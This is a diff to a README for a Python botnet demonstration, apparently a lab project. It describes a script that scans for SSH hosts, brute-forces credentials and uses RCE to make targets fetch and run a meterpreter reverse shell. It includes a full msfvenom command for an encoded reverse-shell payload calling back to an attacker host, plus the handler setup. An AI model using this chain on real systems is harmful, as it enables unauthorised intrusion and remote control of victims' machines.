@@ -1,10 +1,11 @@
-# freshbot
+# simple_bot:
 Demonstration of a simple botnet written in Python.<br>
 <br>
-"scan_drop.py" scans virtual network, if it finds a node with ssh<br>
-running on it performs a dictionary attack. If the credentials are correctly<br>
-provided, RCE directs target to download 2nd payload & execute.<br>
-2nd stage payload is a reverse meterpreter shell to C&C.
+"scan_drop.py" scans virtual network. If it finds a node with ssh<br>
+running it performs a dictionary attack. If successful, RCE directs<br>
+target to download a meterpreter reverse shell payload & execute it.<br>
+Multiprocessing allows for multiple targets to connect to our handler<br>
+at once.<br>
 <br>
 <h3>Environment & Setup</h3>
 1. Our Attack machine: <h4>Linux kali 4.16.0-kali2-amd64</h4>
@@ -17,4 +18,4 @@ provided, RCE directs target to download 2nd payload & execute.<br>
 <br>
 4. Create payload: <h4>msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file</h4>
 5. msf5 > <h4>exploit/multi/handler module</h4>
-6. scan_drop.py <h4>Scan, Dictionary Attack, RCE.</h4>
+6. scan_drop.py <h4>Scan, Dictionary Attack, RCE. </h4>
